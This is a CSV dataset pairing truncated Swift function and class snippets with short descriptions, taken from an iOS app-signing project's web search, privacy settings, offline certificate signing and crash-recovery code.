id,language,folder,code_type,file_path,nl,code
2079,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/Network/WebSearchManager.swift","/ Extract images from HTML","private func extractImages(from html: String, baseURL: URL) -> [URL] {
var images: [URL] = []
let pattern = ""<img[^>]+src=[\""']([^\""']+)[\""'][^>]*>""

do {"
2080,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/Network/WebSearchManager.swift","/ Extract date from HTML","private func extractDate(from html: String) -> Date? {
// Try common date meta tags
let patterns = [
""<meta[^>]+property=[\""']article:published_time[\""'][^>]+content=[\""']([^\""']+)[\""']"",
""<meta[^>]+name=[\""']publication_date[\""'][^>]+content=[\""']([^\""']+)[\""']"",
""<time[^>]+datetime=[\""']([^\""']+)[\""']"",
""<span[^>]+class=[\""']date[\""'][^>]*>([^<]+)</span>"",
]

for pattern in patterns {"
2081,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/Network/WebSearchManager.swift","/ Extract keywords from text","private func extractKeywords(from text: String) -> [String] {
guard !text.isEmpty else { return [] }"
2082,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/Network/WebSearchManager.swift","/ Check if a word is a common stop word","private func isStopWord(_ word: String) -> Bool {
let stopWords = [""the"", ""and"", ""or"", ""but"", ""for"", ""nor"", ""on"", ""at"", ""to"", ""from"", ""by"", ""with"",
""about"", ""against"", ""between"", ""into"", ""through"", ""during"", ""before"", ""after"",
""above"", ""below"", ""under"", ""over"", ""again"", ""further"", ""then"", ""once"", ""here"",
""there"", ""when"", ""where"", ""why"", ""how"", ""all"", ""any"", ""both"", ""each"", ""few"",
""more"", ""most"", ""other"", ""some"", ""such"", ""only"", ""own"", ""same"", ""than"", ""too"",
""very"", ""can"", ""will"", ""just"", ""should"", ""now""]

return stopWords.contains(word)
}"
2083,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/Network/WebSearchManager.swift","/ Generate a summary from text","private func generateSummary(from text: String) -> String {
guard !text.isEmpty else { return """" }"
2084,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/Network/WebSearchManager.swift","MARK: - Private Methods - Relevance and Ranking / Calculate relevance score for a search result","private func calculateRelevanceScore(query: String, result: DeepSearchResult, pageData: PageData) -> Double {
var score = 0.0

// Base score from initial result position
score += max(0.1, result.confidence)

// Split query into terms
let queryTerms = query.lowercased().components(separatedBy: .whitespacesAndNewlines)
.filter { !$0.isEmpty && !self.isStopWord($0) }"
2085,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/Network/WebSearchManager.swift","/ Enhance metadata for search results","private func enhanceResultsMetadata(deepResults: inout [DeepSearchResult], query: String) {
// Extract potential entities from the query
let queryEntities = NaturalLanguageHelper.shared.extractEntities(from: query)

for i in 0 ..< deepResults.count {"
2086,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/Network/WebSearchManager.swift","MARK: - Private Methods - Caching / Get cached search results if available","private func getCachedResults(for key: String) -> [DeepSearchResult]? {
var results: [DeepSearchResult]?

cacheQueue.sync {"
2087,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/Network/WebSearchManager.swift","/ Cache deep search results","private func cacheDeepSearchResults(
_ results: [DeepSearchResult],
for key: String,
query: String,
depth: SearchDepth
) {"
2088,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/Network/WebSearchManager.swift","/ Clean expired entries from cache","private func cleanCache() {
cacheQueue.sync {"
2089,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/Network/WebSearchManager.swift","MARK: - Private Methods - Learning / Log search data for AI learning","private func logSearchDataForLearning(query: String, results: [DeepSearchResult], depth: SearchDepth) {
// Only log if learning is enabled
guard AILearningManager.shared.isLearningEnabled else {"
2090,swift,iOS,class,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/Network/WebSearchManager.swift","MARK: - Privacy Management / Manages privacy settings for search functionality","class SearchPrivacyManager {
// Privacy setting keys
private let searchEnabledKey = ""privacy_search_enabled""
private let deepSearchEnabledKey = ""privacy_deep_search_enabled""
private let crawlingEnabledKey = ""privacy_crawling_enabled""
private let searchCachingEnabledKey = ""privacy_search_caching_enabled""
private let trackedDomainsKey = ""privacy_tracked_domains""

/// Check if general search is enabled
var isSearchEnabled: Bool {"
2091,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/Network/WebSearchManager.swift","/ Update search privacy settings","func updateSettings(
searchEnabled: Bool? = nil,
deepSearchEnabled: Bool? = nil,
crawlingEnabled: Bool? = nil,
cachingEnabled: Bool? = nil
) {"
2092,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/Network/WebSearchManager.swift","/ Add a domain to privacy tracking exclusion list","func excludeDomain(_ domain: String) {
var domains = UserDefaults.standard.stringArray(forKey: trackedDomainsKey) ?? []
if !domains.contains(domain) {"
2093,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/Network/WebSearchManager.swift","/ Remove a domain from privacy tracking exclusion list","func includeDomain(_ domain: String) {
var domains = UserDefaults.standard.stringArray(forKey: trackedDomainsKey) ?? []
domains.removeAll { $0 == domain }"
2094,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/Network/WebSearchManager.swift","/ Check if a domain should be tracked","func shouldTrackDomain(_ domain: String) -> Bool {
let excludedDomains = UserDefaults.standard.stringArray(forKey: trackedDomainsKey) ?? []
return !excludedDomains.contains(domain)
}
}

// MARK: - Helper Extensions

extension DateFormatter {"
2095,swift,iOS,extension,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/Network/WebSearchManager.swift","MARK: - Helper Extensions","extension DateFormatter {
@discardableResult
func apply(_ configuration: (DateFormatter) -> Void) -> DateFormatter {"
2096,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/Network/WebSearchManager.swift","Function apply - implements apply functionality","func apply(_ configuration: (DateFormatter) -> Void) -> DateFormatter {
configuration(self)
return self
}
}
"
2097,swift,iOS,class,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/Security/OfflineSigningManager.swift","/ Manager for handling offline app signing functionality","class OfflineSigningManager {
// MARK: - Properties

/// Singleton instance
static let shared = OfflineSigningManager()

/// Flag indicating if offline signing is enabled
private(set) var isOfflineSigningEnabled = true

/// Flag indicating if local certificates have been validated"
2098,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/Security/OfflineSigningManager.swift","MARK: - Initialization / Validate local certificates for offline signing / Public method to allow validation from outside the class","func validateCertificates() {
// Check if certificates exist at the expected locations
let fileManager = FileManager.default
let certExists = fileManager.fileExists(atPath: serverCertPath.path)
let keyExists = fileManager.fileExists(atPath: serverKeyPath.path)

// Update validation state
localCertificatesValidated = certExists && keyExists
lastCertificateValidationTime = Date()
"
2099,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/Security/OfflineSigningManager.swift","/ Toggle forced offline mode","func toggleForceOfflineMode(_ force: Bool) {
forceOfflineMode = force

// Log the mode change
Debug.shared.log(
message: ""Offline signing mode \(force ? ""forced"" : ""automatic"")"",
type: .info
)

// Post notification for UI updates"
2100,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/Security/OfflineSigningManager.swift","/ Enable/disable offline signing","func setOfflineSigningEnabled(_ enabled: Bool) {
isOfflineSigningEnabled = enabled

// Log the setting change
Debug.shared.log(
message: ""Offline signing \(enabled ? ""enabled"" : ""disabled"")"",
type: .info
)

// Update user defaults"
2101,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/Security/OfflineSigningManager.swift","/ Show offline mode indicator on view","func showOfflineModeIndicator(on view: UIView) {
// Only show indicator if offline mode is active
guard isOfflineModeActive else { return }"
2102,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/Security/OfflineSigningManager.swift","/ Hide offline mode indicator from view","func hideOfflineModeIndicator(from view: UIView) {
if let indicator = view.viewWithTag(8675) {"
2103,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/Security/OfflineSigningManager.swift","/ Import local certificates","func importLocalCertificates(certData: Data, keyData: Data, completion: @escaping (Bool, Error?) -> Void) {
do {"
2104,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/Security/OfflineSigningManager.swift","/ Get certificates for offline signing","func getOfflineSigningCertificates() -> (cert: URL?, key: URL?) {
guard localCertificatesValidated else {"
2105,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/Security/OfflineSigningManager.swift","Function validateLocalCertificates - implements validatelocalcertificates functionality","private func validateLocalCertificates() -> Bool {
// Prevent frequent revalidation
if let lastValidation = lastCertificateValidationTime,
Date().timeIntervalSince(lastValidation) < 60
{ // Only validate once per minute"
2106,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/Security/OfflineSigningManager.swift","/ Create offline mode indicator","private func createOfflineIndicator() -> UIView {
let container = UIView()
container.backgroundColor = UIColor.systemRed.withAlphaComponent(0.8)
container.layer.cornerRadius = 14

// Create label
let label = UILabel()
label.text = ""OFFLINE MODE""
label.font = UIFont.systemFont(ofSize: 12, weight: .bold)
label.textColor = .white"
2107,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/Security/OfflineSigningManager.swift","/ Animate offline indicator","private func animateOfflineIndicator(_ indicator: UIView) {
// Add subtle pulse animation
UIView.animate(withDuration: 1.0, delay: 0, options: [.autoreverse, .repeat, .curveEaseInOut], animations: {"
2108,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/Security/OfflineSigningManager.swift","/ Handle network status changes","@objc private func networkStatusChanged(_ notification: Notification) {
guard let isConnected = notification.userInfo?[""isConnected""] as? Bool else { return }"
2109,swift,iOS,extension,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/Security/OfflineSigningManager.swift","MARK: - Extension for UIViewController","extension UIViewController {
/// Update UI for offline mode
func updateForOfflineMode() {"
2110,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/Security/OfflineSigningManager.swift","/ Update UI for offline mode","func updateForOfflineMode() {
let offlineManager = OfflineSigningManager.shared

if offlineManager.isOfflineModeActive {"
2111,swift,iOS,class,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Utilities/SafeModeLauncher.swift","/ SafeModeLauncher - Detects and recovers from repeated app crashes by providing a minimal safe mode","class SafeModeLauncher {
static let shared = SafeModeLauncher()

// Keys for UserDefaults
private let launchAttemptsKey = ""launchAttempts""
private let safeModeFlagKey = ""inSafeMode""
private let maxLaunchAttempts = 3
private var launchSuccessMarked = false

/// Whether the app is currently in safe mode"
